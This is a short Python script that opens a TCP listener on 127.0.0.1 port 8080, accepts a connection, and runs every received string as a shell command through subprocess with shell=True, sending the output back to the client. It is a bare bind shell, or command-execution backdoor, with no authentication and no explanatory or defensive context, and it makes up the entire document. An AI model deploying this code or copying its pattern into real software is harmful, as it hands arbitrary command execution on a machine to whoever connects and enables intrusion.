import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(('127.0.0.1', 8080)) #binds to the ip and port

s.listen(5) #listens for 5 connections
print("Listening for incoming connections...")
client, addr = s.accept()
print(f"Connection from {addr}")

try:
    while True:
        cmdlet = client.recv(2048).decode()
        if cmdlet.lower() == 'exit':
            break

        print(f"Received command: {cmdlet}")
        results = subprocess.check_output(cmdlet, shell=True).decode("utf-8")
        print(results)

        client.send(results.encode("utf-8"))

except Exception as e:
    print("Error:", str(e))

finally:
    client.close()
    s.close()


